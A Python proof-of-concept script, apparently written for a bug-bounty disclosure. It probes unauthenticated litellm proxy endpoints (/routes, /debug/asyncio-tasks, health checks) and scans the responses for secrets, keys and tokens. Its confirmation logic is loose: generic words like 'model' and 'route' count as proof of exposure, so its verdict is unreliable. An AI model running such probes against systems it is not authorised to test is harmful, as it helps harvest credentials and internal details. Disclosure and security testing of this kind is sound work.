#!/usr/bin/env python3
"""
PoC: Unauthenticated Information Disclosure in BerriAI/litellm
Huntr Report: 5d375293-2430-44d2-b93f-5bf391350483
Target: https://github.com/BerriAI/litellm

Vulnerability: /health/readiness, /routes, and /debug/asyncio-tasks endpoints
expose internal proxy information without authentication.

Setup:
  1. pip install litellm[proxy]
  2. litellm --port 4000
  3. Run this PoC

Usage:
  python3 poc_litellm_info_disclosure.py --target http://localhost:4000
"""

import argparse
import requests
import sys


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:4000")
    args = parser.parse_args()

    print(f"[*] Target: {args.target}")
    print(f"[*] Testing unauthenticated information disclosure...")

    endpoints = [
        ("/health/readiness", "Health readiness check"),
        ("/health/liveliness", "Health liveliness check"),
        ("/routes", "All registered proxy routes"),
        ("/debug/asyncio-tasks", "Running asyncio tasks (debug info)"),
    ]

    confirmed = False
    for path, description in endpoints:
        print(f"\n[*] Testing: {path} — {description}")
        try:
            r = requests.get(f"{args.target}{path}", timeout=10)
            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                print(f"  Content-Type: {r.headers.get('Content-Type', 'N/A')}")
                print(f"  Response: {r.text[:300]}")

                # Check for sensitive info
                sensitive_indicators = [
                    "api_key", "apikey", "secret", "password", "token",
                    "route", "model", "deployment", "endpoint",
                    "task", "coroutine", "pending"
                ]
                for indicator in sensitive_indicators:
                    if indicator.lower() in r.text.lower():
                        print(f"  [!] Contains '{indicator}' information")
                        confirmed = True
            else:
                print(f"  [-] Not accessible ({r.status_code})")

        except requests.exceptions.ConnectionError:
            print(f"  [!] Connection refused — proxy may not be running")
        except Exception as e:
            print(f"  [!] Error: {e}")

    if confirmed:
        print(f"\n[+] VULNERABILITY CONFIRMED — internal information exposed without auth!")
    else:
        print(f"\n[?] Some endpoints returned data — review output above")


if __name__ == "__main__":
    main()
